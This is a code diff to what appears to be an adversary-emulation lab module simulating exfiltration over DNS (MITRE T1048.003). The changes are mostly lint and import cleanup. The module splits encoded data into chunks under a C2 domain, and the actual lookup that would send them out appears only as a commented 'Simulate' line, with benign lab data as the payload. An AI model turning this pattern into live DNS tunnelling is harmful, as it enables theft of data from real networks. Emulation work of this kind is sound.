@@ -3,11 +3,11 @@ campaigns/exfiltration/dns_tunnel.py — T1048.003 Exfiltration Over DNS
 MITRE ATT&CK: T1048.003 | Tactic: Exfiltration
 """
 
-import os
 import base64
-import socket
 import json
-from datetime import datetime, timezone
+import os
+from datetime import UTC, datetime
+
 from campaigns.base_campaign import BaseCampaign
 
 
@@ -44,14 +44,14 @@ class DnsTunnelCampaign(BaseCampaign):
             "dns_queries_generated": len(chunks),
             "chunks_sent": sent,
             "sample_queries": [f"{c}.{self.C2_DOMAIN}" for c in chunks[:3]],
-            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "timestamp": datetime.now(UTC).isoformat(),
         }
         self.save_artifact("dns_tunnel_results.json", json.dumps(results, indent=2))
         return self.build_result(True, f"DNS tunnel demonstrated: {len(chunks)} queries generated")
 
     def _collect_payload(self) -> bytes:
         """Collect benign lab data as exfiltration payload."""
-        data = f"LAB-EXFIL-SIMULATION|{datetime.now(timezone.utc).isoformat()}|user=lab-victim|hostname=victim-web|sensitive_data=DEMO_ONLY"
+        data = f"LAB-EXFIL-SIMULATION|{datetime.now(UTC).isoformat()}|user=lab-victim|hostname=victim-web|sensitive_data=DEMO_ONLY"
         return data.encode()
 
     def _encode_payload(self, payload: bytes) -> list:
@@ -65,7 +65,7 @@ class DnsTunnelCampaign(BaseCampaign):
         # We simulate here for lab safety
         sent = 0
         for chunk in chunks:
-            query = f"{chunk}.{self.C2_DOMAIN}"
-            # Simulate: socket.getaddrinfo(query, None)
+            # Simulate: socket.getaddrinfo(f"{chunk}.{self.C2_DOMAIN}", None)
+            _ = chunk  # silence ruff F841 -- intentional simulation
             sent += 1
         return sent
